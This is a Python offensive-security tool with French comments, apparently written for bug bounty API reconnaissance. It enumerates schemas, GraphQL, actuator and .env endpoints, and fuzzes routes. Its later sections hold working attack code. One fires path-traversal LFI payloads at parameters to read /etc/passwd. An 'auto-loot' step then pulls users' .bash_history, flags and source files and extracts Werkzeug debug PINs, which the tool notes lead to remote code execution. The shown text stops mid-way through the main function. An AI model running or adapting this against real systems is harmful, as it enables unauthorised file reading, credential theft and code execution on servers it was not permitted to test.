#!/usr/bin/env python3
"""
apifinder.py - Decouverte et enumeration d'API (bug bounty)
===========================================================
Fait exactement la Phase 2 "enumeration active d'API" :

  A. Schema / doc     : swagger.json, openapi.json, /api-docs, /docs, /redoc...
                        -> si trouve, PARSE le schema et sort TOUS les endpoints
  B. Versions / bases : /api, /api/v1, /v2, /rest...
  C. GraphQL          : detecte /graphql + teste l'INTROSPECTION
  D. Endpoints juteux : Spring Boot /actuator/env|heapdump, /health, /.env,
                        /metrics, /debug... (fuites de secrets frequentes)
  E. Fuzzing routes   : wordlists API de SecLists (api/objects.txt...) via ffuf
                        ou moteur natif

Usage :
    python apifinder.py http://api.example.com
    python apifinder.py http://api.example.com --fuzz -o rapport_api

[!] Bug bounty AUTORISE uniquement : reste STRICTEMENT dans le scope du programme.
"""

import argparse
import json
import os
import re
import ssl
import sys
import time
import shutil
import subprocess
import http.client
from urllib.parse import urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

# ----------------------------------------------------------------------
class C:
    G = "\033[92m"; Y = "\033[93m"; R = "\033[91m"; B = "\033[94m"
    CY = "\033[96m"; GR = "\033[90m"; BD = "\033[1m"; X = "\033[0m"
if os.name == "nt":
    try:
        import ctypes
        k = ctypes.windll.kernel32
        k.SetConsoleMode(k.GetStdHandle(-11), 7)
    except Exception:
        for a in ("G", "Y", "R", "B", "CY", "GR", "BD", "X"):
            setattr(C, a, "")

def log(m): print(m)
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
EXTRA_HEADERS = {}   # rempli par -H/--header (ex: X-HackerOne-Research)

# ----------------------------------------------------------------------
# HTTP (GET + POST, sans suivre les redirections)
# ----------------------------------------------------------------------
def http_req(url, method="GET", body=None, headers=None, timeout=10, max_body=300000):
    try:
        u = urlparse(url)
        host = u.hostname
        if not host:
            return None
        port = u.port or (443 if u.scheme == "https" else 80)
        path = (u.path or "/") + (("?" + u.query) if u.query else "")
        if u.scheme == "https":
            conn = http.client.HTTPSConnection(host, port, timeout=timeout,
                                               context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        h = {"User-Agent": UA, "Accept": "application/json, */*"}
        if body is not None:
            h["Content-Type"] = "application/json"
        h.update(EXTRA_HEADERS)
        if headers:
            h.update(headers)
        conn.request(method, path, body=body, headers=h)
        r = conn.getresponse()
        data = r.read(max_body)
        hdrs = {k.lower(): v for k, v in r.getheaders()}
        status, loc = r.status, r.getheader("Location")
        conn.close()
        return {"status": status, "headers": hdrs, "body": data,
                "ctype": hdrs.get("content-type", ""), "location": loc,
                "length": len(data)}
    except Exception:
        return None

def is_json(resp):
    if not resp:
        return False
    if "json" in resp["ctype"]:
        return True
    b = resp["body"].strip()[:1]
    return b in (b"{", b"[")

def normalize(target):
    if not re.match(r"^https?://", target, re.I):
        for s in ("https://", "http://"):
            if http_req(s + target, timeout=6):
                return s + target.rstrip("/")
        return "http://" + target.rstrip("/")
    return target.rstrip("/")

# ----------------------------------------------------------------------
# Chemins connus
# ----------------------------------------------------------------------
SCHEMA_PATHS = [
    "swagger.json", "swagger/v1/swagger.json", "v2/api-docs", "v3/api-docs",
    "api-docs", "api-docs/swagger.json", "api/swagger.json", "api/openapi.json",
    "openapi.json", "openapi.yaml", "swagger.yaml", "api/v1/swagger.json",
    "api/v2/swagger.json", "v1/swagger.json", "v1/openapi.json",
    "v2/swagger.json", "v3/swagger.json", "v2/openapi.json", "v3/openapi.json",
    "v2/api-docs.json", "swagger/v2/swagger.json",
    "swagger-ui.html", "swagger/index.html", "docs", "api/docs", "redoc",
    "api/redoc", ".well-known/openapi.json", "swagger/docs/v1", "api-docs.json",
    "swagger-resources", "api/swagger-resources",
]
VERSION_PATHS = ["api", "api/v1", "api/v2", "api/v3", "v1", "v2", "v3",
                 "rest", "api/rest", "graphql", "api/graphql", "services"]
GRAPHQL_PATHS = ["graphql", "api/graphql", "v1/graphql", "graphiql",
                 "playground", "api/graphiql", "query"]
JUICY_API = [
    "health", "api/health", "status", "api/status", "version", "api/version",
    "info", "api/info", "metrics", "api/metrics", "debug", "api/debug",
    ".env", "api/.env", "config", "api/config", "swagger-config",
    # Spring Boot actuator (fuites de secrets tres frequentes)
    "actuator", "actuator/health", "actuator/env", "actuator/mappings",
    "actuator/beans", "actuator/configprops", "actuator/httptrace",
    "actuator/heapdump", "actuator/threaddump", "actuator/loggers",
    "actuator/metrics", "actuator/gateway/routes",
    "manage/health", "manage/env",
]

# ----------------------------------------------------------------------
# SecLists (wordlists API)
# ----------------------------------------------------------------------
SECLISTS_DIRS = [
    "/usr/share/seclists", "/usr/share/wordlists/seclists",
    "/usr/share/wordlists/SecLists", "/opt/seclists", "/opt/SecLists",
    "/usr/share/SecLists",
]
API_WL = ["Discovery/Web-Content/api/objects.txt",
          "Discovery/Web-Content/api/api-endpoints.txt",
          "Discovery/Web-Content/api/common-api-endpoints-mazen160.txt",
          "Discovery/Web-Content/api/api-endpoints-res.txt"]

def find_api_wordlist(override=None):
    dirs = ([override] if override else []) + SECLISTS_DIRS
    for d in dirs:
        if not d:
            continue
        for w in API_WL:
            p = os.path.join(d, w)
            if os.path.isfile(p):
                return p
    return None

# ----------------------------------------------------------------------
# A. Schemas / docs
# ----------------------------------------------------------------------
def find_schemas(base, args):
    log(f"\n{C.B}{C.BD}[A] Schemas / documentation API...{C.X}")
    found = []
    def check(p):
        r = http_req(f"{base}/{p}", timeout=args.timeout)
        if r and r["status"] in (200, 301, 302, 401, 403):
            return p, r
    with ThreadPoolExecutor(max_workers=20) as ex:
        for fu in as_completed([ex.submit(check, p) for p in SCHEMA_PATHS]):
            r = fu.result()
            if r:
                p, resp = r
                found.append((p, resp))
                tag = ""
                if is_json(resp) and (b"swagger" in resp["body"][:2000].lower()
                                      or b"openapi" in resp["body"][:2000].lower()
                                      or b'"paths"' in resp["body"][:5000]):
                    tag = f" {C.G}<- SCHEMA API !{C.X}"
                log(f"    {C.G}{resp['status']}{C.X}  /{p}{tag}")
    if not found:
        log(f"  {C.GR}(aucun schema/doc trouve){C.X}")
    return found

def parse_schema(resp):
    """Parse un swagger/openapi JSON -> liste (methode, chemin)."""
    endpoints = []
    try:
        spec = json.loads(resp["body"].decode("utf-8", "ignore"))
    except Exception:
        return endpoints, None
    base_path = spec.get("basePath", "")
    servers = spec.get("servers", [])
    if servers and isinstance(servers, list):
        base_path = servers[0].get("url", base_path) if isinstance(servers[0], dict) else base_path
    paths = spec.get("paths", {})
    for path, methods in paths.items():
        if isinstance(methods, dict):
            for m in methods:
                if m.lower() in ("get", "post", "put", "delete", "patch", "options", "head"):
                    endpoints.append((m.upper(), base_path.rstrip("/") + path))
    return endpoints, spec.get("info", {}).get("title")

# ----------------------------------------------------------------------
# B. Versions / bases
# ----------------------------------------------------------------------
def find_versions(base, args):
    log(f"\n{C.B}{C.BD}[B] Chemins de version / bases API...{C.X}")
    hits = []
    def check(p):
        r = http_req(f"{base}/{p}", timeout=args.timeout)
        if r and r["status"] not in (404,):
            return p, r
    with ThreadPoolExecutor(max_workers=15) as ex:
        for fu in as_completed([ex.submit(check, p) for p in VERSION_PATHS]):
            r = fu.result()
            if r:
                p, resp = r
                j = f" {C.CY}[JSON]{C.X}" if is_json(resp) else ""
                hits.append((p, resp["status"], is_json(resp)))
                log(f"    {C.G}{resp['status']}{C.X}  /{p}{j}")
    if not hits:
        log(f"  {C.GR}(rien){C.X}")
    return hits

# ----------------------------------------------------------------------
# C. GraphQL introspection
# ----------------------------------------------------------------------
def check_graphql(base, args):
    log(f"\n{C.B}{C.BD}[C] GraphQL / introspection...{C.X}")
    q = json.dumps({"query": "query{__schema{queryType{name} types{name}}}"})
    results = []
    for p in GRAPHQL_PATHS:
        url = f"{base}/{p}"
        r = http_req(url, timeout=args.timeout)
        if not r or r["status"] == 404:
            continue
        # tente l'introspection en POST
        rp = http_req(url, method="POST", body=q, timeout=args.timeout)
        introspect = False
        if rp and b"__schema" in rp["body"] or (rp and b'"queryType"' in rp["body"]):
            introspect = True
        if rp and b'"types"' in rp["body"] and rp["status"] == 200:
            introspect = True
        if r["status"] in (200, 400, 401, 403) or introspect:
            tag = f" {C.R}{C.BD}<- INTROSPECTION ACTIVE !{C.X}" if introspect else ""
            log(f"    {C.G}{r['status']}{C.X}  /{p}{tag}")
            results.append({"path": p, "status": r["status"], "introspection": introspect})
    if not results:
        log(f"  {C.GR}(pas de GraphQL detecte){C.X}")
    return results

# ----------------------------------------------------------------------
# D. Endpoints juteux
# ----------------------------------------------------------------------
def check_juicy(base, args):
    log(f"\n{C.B}{C.BD}[D] Endpoints juteux (actuator, health, .env...)...{C.X}")
    hits = []
    def check(p):
        r = http_req(f"{base}/{p}", timeout=args.timeout)
        if r and r["status"] in (200, 401, 403, 500):
            return p, r
    with ThreadPoolExecutor(max_workers=20) as ex:
        for fu in as_completed([ex.submit(check, p) for p in JUICY_API]):
            r = fu.result()
            if r:
                p, resp = r
                danger = ""
                if resp["status"] == 200 and ("env" in p or "heapdump" in p
                                              or ".env" in p or "configprops" in p):
                    danger = f" {C.R}{C.BD}<- POTENTIELLEMENT SENSIBLE !{C.X}"
                j = f" {C.CY}[JSON]{C.X}" if is_json(resp) else ""
                hits.append({"path": p, "status": resp["status"],
                             "length": resp["length"], "json": is_json(resp)})
                col = C.G if resp["status"] == 200 else C.Y
                log(f"    {col}{resp['status']}{C.X}  /{p}  {C.GR}[{resp['length']} o]{C.X}{j}{danger}")
    if not hits:
        log(f"  {C.GR}(rien){C.X}")
    return hits

# ----------------------------------------------------------------------
# F. Fuite de schema DTO via erreurs de validation
# ----------------------------------------------------------------------
# Les frameworks modernes REVELENT les champs requis (et parfois le classpath)
# dans leurs erreurs de validation. En envoyant un corps vide puis en ajoutant
# les champs un a un, on reconstruit le DTO SANS documentation ni auth.
FRAMEWORK_SIGNS = [
    ("Micronaut",  lambda b, h: '"_embedded"' in b and '"_links"' in b),
    ("Spring Boot", lambda b, h: '"timestamp"' in b and '"path"' in b) ,
    ("Spring (valid)", lambda b, h: '"defaultMessage"' in b or '"bindingResult"' in b),
    ("FastAPI/Pydantic", lambda b, h: '"loc"' in b and '"msg"' in b),
    ("Laravel", lambda b, h: 'The given data was invalid' in b or '"errors"' in b and 'laravel' in h.get("set-cookie","").lower()),
    ("ASP.NET Core", lambda b, h: 'One or more validation errors' in b or "kestrel" in h.get("server","").lower()),
    ("Django REST", lambda b, h: 'wsgiserver' in h.get("server","").lower() or '"detail"' in b and 'method' in b.lower()),
    ("Rails", lambda b, h: 'param is missing' in b),
    ("Express/Node", lambda b, h: 'Cannot POST' in b or 'Unexpected token' in b or 'express' in h.get("x-powered-by","").lower()),
]
# regex qui extraient un/des nom(s) de champ requis selon le framework
FIELD_RX = [
    re.compile(r"parameter\s+([A-Za-z_]\w+)"),                         # Micronaut/Jackson
    re.compile(r"Required\s+(?:Body|argument|Parameter)\s+\[?([A-Za-z_]\w+)"),
    re.compile(r'"loc"\s*:\s*\[\s*"[^"]*"\s*,\s*"([A-Za-z_]\w+)"'),    # FastAPI
    re.compile(r'"field"\s*:\s*"([A-Za-z_]\w+)"'),                     # Spring valid
    re.compile(r"param is missing[^:]*:\s*([A-Za-z_]\w+)"),           # Rails
    re.compile(r'"([A-Za-z_]\w+)"\s*:\s*\[\s*"[^"]*(?:required|obligatoire|manquant)'),  # DRF/.NET/Laravel
    re.compile(r"([A-Za-z_]\w+)\s+(?:is required|must not be null|cannot be null)", re.I),
    re.compile(r"Missing\s+(?:required\s+)?(?:field|parameter)\s+['\"]?([A-Za-z_]\w+)"),
]
CLASSPATH_RX = re.compile(r"(?:instance of|construct)\s+[`'\"]?([a-zA-Z_][\w.$]+\.[A-Z]\w+)")
CTYPE_RX = re.compile(r"[Aa]llowed(?:\s+types)?\s*:?\s*\[?\s*([a-z]+/[a-z0-9.+-]+)")

def _fingerprint(body_text, hdrs):
    for name, fn in FRAMEWORK_SIGNS:
        try:
            if fn(body_text, hdrs):
                return name
        except Exception:
            pass
    return "?"

def _extract_fields(body_text):
    fields = []
    for rx in FIELD_RX:
        for m in rx.finditer(body_text):
            f = m.group(1)
            if f and f.lower() not in ("form", "request", "body", "null", "dto") and f not in fields:
                fields.append(f)
    return fields

# valeurs heuristiques par nom de champ : evite de caler sur enums/URI/types
# (sinon la valeur "1" fait echouer la conversion et masque le champ suivant)
FILLERS = [
    (("response_type", "responsetype"), "code"),
    (("grant_type", "granttype"), "authorization_code"),
    (("scope",), "openid"),
    (("code_challenge_method", "challengemethod"), "S256"),
    (("code_challenge", "challenge"), "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"),
    (("redirect_uri", "redirecturi", "redirect_url", "redirecturl", "url", "uri", "callback"), "https://example.com/"),
    (("email", "mail"), "test@example.com"),
    (("phone", "msisdn", "telephone"), "+15555550100"),
    (("nonce", "state"), "abc123xyz"),
    (("client_id", "clientid"), "test"),
    (("password", "passwd", "pwd"), "Password123!"),
    (("bool", "enabled", "active", "require"), "true"),
]
def _filler(field):
    fl = field.lower()
    for keys, val in FILLERS:
        if any(k in fl for k in keys):
            return val
    return "1"

def _variants(field):
    """camelCase <-> snake_case : on envoie les deux, le binder honore la bonne
    (Jackson SNAKE_CASE attend response_type, l'API peut vouloir responseType)."""
    snake = re.sub(r"(?<!^)(?=[A-Z])", "_", field).lower()
    parts = field.split("_")
    camel = parts[0] + "".join(w.capitalize() for w in parts[1:])
    return {field, snake, camel}

def _encode(fields, ctype):
    """Construit un corps avec les champs connus (valeur heuristique) selon le content-type.
    Si aucun champ connu, on met un champ-sonde pour que le binder tente de construire
    le DTO (sinon certains frameworks repondent juste 'body manquant')."""
    payload = {}
    for f in fields:
        val = _filler(f)
        for name in _variants(f):
            payload[name] = val
    if not payload:
        payload = {"_probe": "1"}
    if "form-urlencoded" in ctype:
        from urllib.parse import urlencode
        return urlencode(payload), {"Content-Type": "application/x-www-form-urlencoded"}
    return json.dumps(payload), {"Content-Type": "application/json"}

def probe_dto(url, args, method="POST"):
    """Reconstruit le DTO d'un endpoint par fuite d'erreurs de validation."""
    ctype = "application/json"
    known, classpath, framework = [], None, "?"
    rounds, samples = 0, []
    body_str, hdr = _encode(known, ctype)
    while rounds < 15:
        rounds += 1
        r = http_req(url, method=method, body=body_str, headers=hdr, timeout=args.timeout)
        if not r:
            return None
        bt = r["body"].decode("utf-8", "ignore")
        samples.append({"round": rounds, "status": r["status"], "snippet": bt[:200]})
        # content-type impose ? (415)
        mc = CTYPE_RX.search(bt)
        if r["status"] == 415 and mc:
            ctype = mc.group(1)
            body_str, hdr = _encode(known, ctype)
            continue
        if framework == "?":
            framework = _fingerprint(bt, r["headers"])
        cp = CLASSPATH_RX.search(bt)
        if cp and not classpath:
            classpath = cp.group(1)
        new = [f for f in _extract_fields(bt) if f not in known]
        if not new:
            # plus de champ requis manquant -> on s'arrete (on a atteint la validation metier)
            return {"url": url, "method": method, "framework": framework,
                    "content_type": ctype, "fields": known, "classpath": classpath,
                    "final_status": r["status"], "final_body": bt[:300], "rounds": rounds}
        known += new
        body_str, hdr = _encode(known, ctype)
    return {"url": url, "method": method, "framework": framework, "content_type": ctype,
            "fields": known, "classpath": classpath, "final_status": None,
            "final_body": "(15 tours atteints)", "rounds": rounds}

def run_dto(base, endpoints, args):
    log(f"\n{C.B}{C.BD}[F] Fuite de schema DTO (erreurs de validation)...{C.X}")
    results = []
    targets = []
    for ep in endpoints:
        ep = ep.strip()
        if not ep:
            continue
        url = ep if re.match(r"^https?://", ep) else f"{base}/{ep.lstrip('/')}"
        targets.append(url)
    if not targets:
        log(f"  {C.GR}(aucun endpoint a sonder — passe -e /chemin ou active un schema){C.X}")
        return results
    for url in targets:
        res = probe_dto(url, args)
        if not res:
            log(f"  {C.GR}injoignable : {url}{C.X}")
            continue
        results.append(res)
        fw = f"{C.CY}{res['framework']}{C.X}"
        log(f"  {C.G}{C.BD}{url}{C.X}  [{fw}, {res['content_type']}]")
        if res["classpath"]:
            log(f"    {C.R}classpath fuite : {res['classpath']}{C.X}")
        if res["fields"]:
            log(f"    {C.Y}champs requis ({len(res['fields'])}) : {C.X}"
                + ", ".join(res["fields"]))
        log(f"    {C.GR}validation atteinte (status {res['final_status']}): "
            f"{res['final_body'][:120]}{C.X}")
    return results

# ----------------------------------------------------------------------
# E. Fuzzing des routes API
# ----------------------------------------------------------------------
def calibrate(base, timeout):
    import random, string
    rnd = "".join(random.choice(string.ascii_lowercase) for _ in range(14))
    r = http_req(f"{base}/{rnd}", timeout=timeout)
    return (r["status"], r["length"]) if r else (404, 0)

def fuzz_native(base, wordlist, args):
    words = []
    try:
        with open(wordlist, encoding="utf-8", errors="ignore") as f:
            for line in f:
                w = line.strip().lstrip("/")
                if w and not w.startswith("#"):
                    words.append(w)
    except Exception:
        return []
    soft = calibrate(base, args.timeout)
    hits = []
    def check(w):
        r = http_req(f"{base}/{w}", timeout=args.timeout, max_body=2048)
        if not r or r["status"] == 404:
            return None
        if r["status"] == soft[0] and abs(r["length"] - soft[1]) < 40:
            return None
        return {"path": w, "status": r["status"], "length": r["length"],
                "json": is_json(r)}
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        for fu in as_completed([ex.submit(check, w) for w in words]):
            r = fu.result()
            if r:
                hits.append(r)
    return hits

def fuzz_ffuf(base, wordlist, args):
    import tempfile
    out = os.path.join(tempfile.gettempdir(), "apiffuf_%d.json" % int(time.time()*1000))
    cmd = ["ffuf", "-u", base + "/FUZZ", "-w", wordlist, "-t", str(args.threads),
           "-ac", "-s", "-noninteractive", "-mc", "200,201,204,301,302,401,403,405,500",
           "-o", out, "-of", "json"]
    hits = []
    try:
        subprocess.run(cmd, capture_output=True, timeout=args.max_time)
        if os.path.isfile(out):
            for it in json.load(open(out, encoding="utf-8")).get("results", []):
                hits.append({"path": urlparse(it.get("url", "")).path.lstrip("/"),
                             "status": it.get("status"), "length": it.get("length"),
                             "json": False})
            os.remove(out)
    except Exception as e:
        log(f"{C.R}    ffuf : {e}{C.X}")
    return hits

def fuzz_routes(base, args):
    wl = find_api_wordlist(args.seclists)
    if not wl:
        log(f"\n{C.B}{C.BD}[E] Fuzzing routes API...{C.X}")
        log(f"  {C.Y}SecLists (wordlists api) introuvable -> etape sautee. "
            f"(--seclists /chemin){C.X}")
        return []
    engine = "ffuf" if shutil.which("ffuf") else "natif"
    log(f"\n{C.B}{C.BD}[E] Fuzzing routes API{C.X} "
        f"{C.GR}({os.path.basename(wl)}, moteur {engine}){C.X}")
    hits = fuzz_ffuf(base, wl, args) if engine == "ffuf" else fuzz_native(base, wl, args)
    for h in sorted(hits, key=lambda x: x["status"])[:60]:
        j = f" {C.CY}[JSON]{C.X}" if h.get("json") else ""
        log(f"    {C.G}{h['status']}{C.X}  /{h['path']}{j}")
    if not hits:
        log(f"  {C.GR}(rien){C.X}")
    return hits

# ----------------------------------------------------------------------
# G. LFI sur parametres + PIVOT DE VERSION (leçon Bookstore : la faille etait
#    sur /api/v1/... alors que la doc annoncait v2 ; param cache "show")
# ----------------------------------------------------------------------
LFI_PARAMS = ["show", "file", "path", "page", "doc", "document", "view",
              "template", "load", "read", "download", "filename", "include",
              "name", "folder", "dir", "item", "resource", "content", "data",
              "cat", "conf", "config", "action", "detail", "src", "log", "img"]
LFI_PAYLOADS = ["/etc/passwd",
                "../../../../../../../../etc/passwd",
                "....//....//....//....//....//....//etc/passwd",
                "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"]
PASSWD_RX = re.compile(r"root:.*?:0:0:")

def _version_variants(path):
    """/api/v2/resources/books -> variantes v0..v4 du meme chemin (versions cachees)."""
    m = re.search(r"/v(\d+)/", path)
    if not m:
        return {path}
    out = {path}
    for n in range(0, 5):
        out.add(path[:m.start()] + f"/v{n}/" + path[m.end():])
    return out

def harvest_doc_endpoints(base, args):
    """Extrait les chemins d'API cites dans la doc/HTML (/, /api, robots.txt) —
    beaucoup d'API listent leurs routes en clair. Genere les variantes de version."""
    paths = set()
    for p in ("", "api", "api/", "docs", "api/docs", "robots.txt", "swagger.json"):
        r = http_req(f"{base}/{p}", timeout=args.timeout)
        if not r or r["status"] == 404:
            continue
        bt = r["body"].decode("utf-8", "ignore")
        for m in re.finditer(r"/(?:api|rest|v\d+)/[A-Za-z0-9_./-]+", bt):
            path = m.group(0).split("?")[0].rstrip("/.")
            if 4 < len(path) < 120:
                paths.add(path)
    pivoted = set()
    for p in paths:
        pivoted |= _version_variants(p)
    return paths, pivoted

def probe_lfi(base, args, extra=None):
    """Fuzz des parametres LFI (show/file/path...) sur les endpoints connus + les
    versions pivotees, avec payloads de traversal. Detecte /etc/passwd."""
    log(f"\n{C.B}{C.BD}[G] LFI sur parametres + pivot de version...{C.X}")
    doc_paths, pivoted = harvest_doc_endpoints(base, args)
    cand = set(pivoted) | set(doc_paths) | set(extra or [])
    # fallback si la doc ne liste rien : quelques bases classiques
    if not cand:
        cand = {"/api/v1/resources/books", "/api/v2/resources/books",
                "/api", "/download", "/file", "/view"}
    jobs = []
    for ep in sorted(cand):
        ep = "/" + ep.lstrip("/")
        for param in LFI_PARAMS:
            jobs.append((ep, param))
    hits, found_ep = [], set()
    def check(job):
        ep, param = job
        if ep in found_ep:                       # un param LFI deja trouve ici
            return None
        for pl in LFI_PAYLOADS:
            r = http_req(f"{base}{ep}?{param}={quote(pl, safe='')}",
                         timeout=args.timeout, max_body=8192)
            if r and PASSWD_RX.search(r["body"].decode("utf-8", "ignore")):
                return {"endpoint": ep, "param": param, "payload": pl}
        return None
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        for fu in as_completed([ex.submit(check, j) for j in jobs]):
            r = fu.result()
            if r and r["endpoint"] not in found_ep:
                found_ep.add(r["endpoint"])
                hits.append(r)
                log(f"    {C.R}{C.BD}LFI !{C.X}  {r['endpoint']}?{C.Y}{r['param']}"
                    f"{C.X}={r['payload']}")
    if not hits:
        log(f"  {C.GR}(aucune LFI detectee sur les parametres testes){C.X}")
    return hits

def loot_lfi(base, args, lfi):
    """Une fois la LFI confirmee : lit /etc/passwd -> homes, puis tente
    user.txt / .bash_history / le code source (souvent le PIN Werkzeug ou des creds)."""
    if not lfi:
        return []
    ep, param = lfi[0]["endpoint"], lfi[0]["param"]
    def read(pathfile):
        pl = "../" * 10 + pathfile.lstrip("/") if not pathfile.startswith("/") else pathfile
        r = http_req(f"{base}{ep}?{param}={quote(pathfile, safe='')}",
                     timeout=args.timeout, max_body=20000)
        return r["body"].decode("utf-8", "ignore") if r and r["status"] == 200 else ""
    log(f"\n{C.B}{C.BD}[G+] Auto-loot via la LFI ({ep}?{param}=)...{C.X}")
    loot = []
    passwd = read("/etc/passwd")
    homes = re.findall(r"^([^:]+):x:\d{4,}:\d+:[^:]*:(/home/[^:]+):", passwd, re.M)
    for user, home in homes:
        for f in (f"{home}/user.txt", f"{home}/.bash_history",
                  f"{home}/api.py", f"{home}/app.py", f"{home}/api-up.sh"):
            c = read(f)
            if c.strip():
                loot.append({"file": f, "content": c[:2000]})
                flag = re.search(r"\b[0-9a-f]{32}\b", c)
                pin = re.search(r"WERKZEUG_DEBUG_PIN\s*=\s*([\d-]+)", c)
                tag = ""
                if f.endswith("user.txt") and flag:
                    tag = f"  {C.G}{C.BD}<- FLAG {flag.group(0)}{C.X}"
                elif pin:
                    tag = f"  {C.R}{C.BD}<- PIN Werkzeug {pin.group(1)}{C.X}"
                log(f"    {C.G}lu{C.X} {f}  {C.GR}({len(c)} o){C.X}{tag}")
    if not loot:
        log(f"  {C.GR}(rien de lisible dans les homes){C.X}")
    return loot

# ----------------------------------------------------------------------
# H. Console de debug Werkzeug (RCE si PIN devine/fixe)
# ----------------------------------------------------------------------
def check_werkzeug(base, args):
    log(f"\n{C.B}{C.BD}[H] Console de debug Werkzeug...{C.X}")
    r = http_req(f"{base}/console", timeout=args.timeout)
    info = {}
    if r and (b"Werkzeug" in r["body"] or b"__debugger__" in r["body"]
              or b"pin-prompt" in r["body"]):
        bt = r["body"].decode("utf-8", "ignore")
        locked = "Console Locked" in bt or "pin-prompt" in bt
        sec = re.search(r'SECRET\s*=\s*"([^"]+)"', bt)
        info = {"present": True, "locked": locked,
                "secret": sec.group(1) if sec else None}
        log(f"    {C.R}{C.BD}Console Werkzeug presente sur /console{C.X}"
            f"  ({'verrouillee' if locked else 'DEVERROUILLEE !'})")
        if info["secret"]:
            log(f"    {C.Y}SECRET = {info['secret']}{C.X}")
        log(f"    {C.GR}-> RCE si PIN trouve : cherche WERKZEUG_DEBUG_PIN dans "
            f"les scripts (via LFI) ou calcule-le (machine-id+mac).{C.X}")
    else:
        log(f"  {C.GR}(pas de console Werkzeug){C.X}")
    return info

# ----------------------------------------------------------------------
def save_report(base, data, out):
    b = out.rsplit(".", 1)[0]
    with open(b + ".json", "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    with open(b + ".txt", "w", encoding="utf-8") as f:
        f.write(f"# apifinder - {base}\n\n")
        if data["endpoints"]:
            f.write(f"[Endpoints documentes ({len(data['endpoints'])})]\n")
            for m, path in data["endpoints"]:
                f.write(f"  {m:<7} {path}\n")
        f.write("\n[Endpoints juteux]\n")
        for h in data["juicy"]:
            f.write(f"  {h['status']}  /{h['path']}  [{h['length']} o]\n")
        if data.get("dto"):
            f.write("\n[DTO reconstruits (fuite via erreurs de validation)]\n")
            for d in data["dto"]:
                f.write(f"  {d['method']} {d['url']}  [{d['framework']}, {d['content_type']}]\n")
                if d["classpath"]:
                    f.write(f"    classpath: {d['classpath']}\n")
                f.write(f"    champs requis: {', '.join(d['fields']) or '(aucun)'}\n")
                f.write(f"    validation (status {d['final_status']}): {d['final_body'][:160]}\n")
        if data.get("lfi"):
            f.write("\n[LFI (parametres)]\n")
            for l in data["lfi"]:
                f.write(f"  {l['endpoint']}?{l['param']}={l['payload']}\n")
        if data.get("lfi_loot"):
            f.write("\n[Fichiers lus via LFI]\n")
            for lt in data["lfi_loot"]:
                f.write(f"  --- {lt['file']} ---\n{lt['content']}\n")
        if data.get("werkzeug", {}).get("present"):
            w = data["werkzeug"]
            f.write(f"\n[Console Werkzeug] /console  "
                    f"({'verrouillee' if w.get('locked') else 'DEVERROUILLEE'})"
                    f"  SECRET={w.get('secret')}\n")
        f.write("\n[Routes fuzz]\n")
        for h in data["fuzz"]:
            f.write(f"  {h['status']}  /{h['path']}\n")
    log(f"\n{C.G}[+] Rapport : {b}.txt / {b}.json{C.X}")

BANNER = f"""{C.CY}{C.BD}
  apifinder.py  -  decouverte & enumeration d'API{C.X}
{C.GR}  schemas -> endpoints -> graphql -> actuator -> fuzz{C.X}
{C.Y}  by 12akHack{C.GR}  -  outil de securite offensive{C.X}
{C.R}  [!] Bug bounty AUTORISE uniquement : reste STRICTEMENT dans le scope.{C.X}
"""

def main():
    p = argparse.ArgumentParser(
        description="apifinder.py - decouverte et enumeration d'API",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
------------------------------------------------------------------------
 GUIDE
------------------------------------------------------------------------
 Scan API automatique :
    python apifinder.py http://api.example.com

 + fuzzing des routes (wordlists API SecLists) + rapport :
    python apifinder.py http://api.example.com --fuzz -o rapport_api

 Ce qu'il fait :
   A. schemas/doc (swagger/openapi) -> parse tous les endpoints documentes
   B. chemins de version (/api/v1, /v2...)
   C. GraphQL + test d'introspection
   D. endpoints juteux (Spring Boot actuator, /health, /.env, heapdump...)
   E. fuzzing des routes (--fuzz, wordlists api/ de SecLists)

 EXEMPLE COMPLET (tu as trouve une API) :
    python apifinder.py https://api.cible.com --fuzz -o rapport_api
        # -> cherche swagger/openapi et PARSE tous les endpoints documentes,
        #    teste GraphQL introspection, chasse /actuator/env & co, fuzz routes
    # Resultat: la carte complete de l'API pour tester IDOR/auth ensuite (manuel).

 [!] Reste STRICTEMENT dans le scope autorise du programme.
------------------------------------------------------------------------
""")
    p.add_argument("url", nargs="?", help="URL de l'API (http://api.example.com)")
    p.add_argument("--dto", action="store_true",
                   help="Fuite de schema DTO : reconstruit les champs requis via les erreurs de validation")
    p.add_argument("-e", "--endpoint", action="append", default=[],
                   help="Endpoint(s) a sonder pour le DTO (repetable, ex: -e /auth/api/v1/auth-flow/par)")
    p.add_argument("-H", "--header", action="append", default=[],
                   help="Header custom 'Nom: valeur' (repetable, ex: X-HackerOne-Research)")
    p.add_argument("--fuzz", action="store_true", help="Activer le fuzzing des routes (SecLists)")
    p.add_argument("--no-lfi", action="store_true",
                   help="Desactiver le test LFI (parametres show/file...) + pivot de version + console Werkzeug")
    p.add_argument("--seclists", help="Chemin de SecLists si non trouve")
    p.add_argument("-t", "--threads", type=int, default=40, help="Threads (defaut 40)")
    p.add_argument("--timeout", type=float, default=10, help="Timeout par requete (defaut 10)")
    p.add_argument("--max-time", type=int, default=600, help="Temps max fuzzing (defaut 600)")
    p.add_argument("-o", "--output", help="Nom de base du rapport (.txt .json)")
    args = p.parse_args()

    print(BANNER)
    if not args.url:
        p.print_help(); sys.exit(0)

    for hv in args.header:
        if ":" in hv:
            k, v = hv.split(":", 1)
            EXTRA_HEADERS[k.strip()] = v.strip()

    base = normalize(args.url)
    root = http_req(base + "/", timeout=args.timeout)
    if root is None:
        log(f"{C.R}[!] API injoignable : {base}{C.X}"); sys.exit(1)
    log(f"{C.CY}{C.BD}[*] Cible : {base}{C.X}  {C.GR}(/ -> {root['status']}, "
        f"{root['ctype'][:30]}){C.X}")
    start = time.time()

    data = {"target": base, "schemas": [], "endpoints": [], "versions": [],
            "graphql": [], "juicy": [], "fuzz": [], "dto": [],
